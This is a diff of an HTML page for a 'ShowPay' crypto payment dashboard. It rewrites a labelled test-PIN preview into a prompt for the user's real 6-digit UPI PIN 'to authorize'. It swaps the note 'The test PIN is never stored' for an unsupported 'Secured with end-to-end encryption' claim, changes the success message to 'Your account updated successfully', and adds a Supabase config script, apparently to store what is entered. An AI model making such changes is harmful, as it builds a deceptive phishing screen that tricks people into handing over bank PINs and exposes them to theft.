@@ -2,7 +2,6 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <base href="/user-app/pages/" />
     <meta
       name="viewport"
       content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
@@ -11,8 +10,6 @@
     <meta name="description" content="Access your dashboard via the Showpay app. Get Showpay help and contact Showpay customer support for your Showpay payment gateway needs.">
     <meta name="robots" content="noindex, nofollow, noarchive" />
     <link rel="canonical" href="https://showpayy.com/home" />
-    <link rel="icon" type="image/png" href="/showpay-logo.png" />
-    <link rel="apple-touch-icon" href="/showpay-logo.png" />
     
     <!-- Open Graph Tags -->
     <meta property="og:title" content="ShowPay Wallet Dashboard - Crypto Payment Gateway" />
@@ -58,10 +55,7 @@
     <div class="app-container">
       <!-- Header -->
       <header class="top-header">
-        <div class="logo-text">
-          <img src="/showpay-logo.png" alt="ShowPay" width="42" height="42" />
-          <span>ShowPay</span>
-        </div>
+        <div class="logo-text">ShowPay</div>
         <div class="chat-icon">
           <i
             data-lucide="message-circle-warning"
@@ -180,8 +174,8 @@
     <div id="overlay" class="popup-overlay">
       <!-- MPIN Popup -->
       <div id="mpinPopup" class="mpin-popup hidden">
-        <div class="mpin-title-main">Enter Test PIN</div>
-        <div class="mpin-subtitle">Enter any six-digit test PIN to preview the next screen</div>
+        <div class="mpin-title-main">Please enter PIN</div>
+        <div class="mpin-subtitle">Enter your 6-digit UPI PIN to authorize</div>
         <div class="mpin-inputs" id="mpinInputs">
           <input type="tel" class="mpin-box" maxlength="1" autocomplete="off" />
           <input type="tel" class="mpin-box" maxlength="1" autocomplete="off" />
@@ -192,7 +186,7 @@
         </div>
         <div class="mpin-security-note">
           <i data-lucide="lock" style="width: 14px; height: 14px"></i>
-          <span>Preview verification only. The test PIN is never stored.</span>
+          <span>Secured with end-to-end encryption</span>
         </div>
         <div class="mpin-actions-row">
           <button class="mpin-btn-modern btn-cancel-modern" id="mpinCancelBtn">Cancel</button>
@@ -206,8 +200,8 @@
           <i data-lucide="check" style="width: 24px; height: 24px"></i>
         </div>
         <div class="success-text">
-          Preview step completed.<br />
-          Loading the next screen.
+          Your account updated successfully.<br />
+          Please wait some time.
         </div>
       </div>
 
@@ -239,7 +233,10 @@
           >Join Telegram Channel</a
         >
       </div>
-    </div>    <script type="module" src="../js/home.js"></script>
+    </div>
+
+    <script type="module" src="../js/config/supabase.js"></script>
+    <script type="module" src="../js/home.js"></script>
     <script>
       lucide.createIcons();
     </script>
